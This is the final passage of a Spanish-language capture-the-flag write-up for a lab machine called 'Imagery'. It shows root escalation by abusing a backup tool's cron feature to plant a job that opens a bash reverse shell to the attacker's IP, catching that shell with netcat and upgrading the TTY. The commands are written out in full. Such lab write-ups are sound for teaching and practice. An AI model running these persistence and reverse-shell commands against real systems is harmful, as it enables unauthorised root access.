[2025-10-01 03:27:22] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> 
~~~

Con el comando `help` listaremos todos los comandos disponibles, veremos el comando `auto add` que nos permite crear una tarea  `cron`.

~~~ bash
Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
~~~

Como estamos ejecutando esta herramienta como el usuario `root`, la tarea `cron` se ejecutará con privilegios elevados a nivel de sistema.

Añadiremos una nueva tarea `cron`. Esta se encargará de ejecutar una reverse shell hacia nuestra IP por un puerto

~~~ bash
charcol> auto add --schedule "* * * * *" --command 'bash -c "bash -i >& /dev/tcp/10.10.14.11/443 0>&1"' --name "rev_shell"

[2025-10-01 03:03:26] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-10-01 03:03:28] [INFO] System password verified successfully.
[2025-10-01 03:03:28] [INFO] Auto job 'rev_shell' (ID: 88738d26-2932-49eb-a466-162dca510b90) added successfully. The job will run according to schedule.
[2025-10-01 03:03:28] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true bash -c "bash -i >& /dev/tcp/10.10.14.11/443 0>&1"
~~~

Rápidamente iniciaremos un listener en el puerto que elegimos, el cual se encargará de recibir la reverse shell que la tarea `cron` ejecuta

~~~ bash
nc -lvnp 443
listening on [any] 443 ...
~~~


## Root Time

Desde nuestro nuevo listener obtendremos una consola como el usuario `root`

~~~ bash
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.88] 36608
bash: cannot set terminal process group (496299): Inappropriate ioctl for device
bash: no job control in this shell
root@Imagery:~# 
~~~

Opcionalmente podemos hacer un tratamiento de la TTY para operar con una consola interactiva

~~~ bash
root@Imagery:~# script /dev/null -c bash      
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@Imagery:~# ^Z
[1]  + 79883 suspended  nc -lvnp 443
root@parrot imagery # stty raw -echo;fg
[1]  + 79883 continued  nc -lvnp 443
                                    reset xterm
root@Imagery:~# export TERM=xterm
root@Imagery:~# stty rows 44 columns 184
~~~

Ya podemos ver la última flag ubicada en el directorio `/root`

~~~ bash
root@Imagery:~# cat root.txt 
cb2...
~~~

Gracias por leer, a continuación te dejo la cita del día.

> Light tomorrow with today!
> — Elizabeth Browning
{: .notice--info}
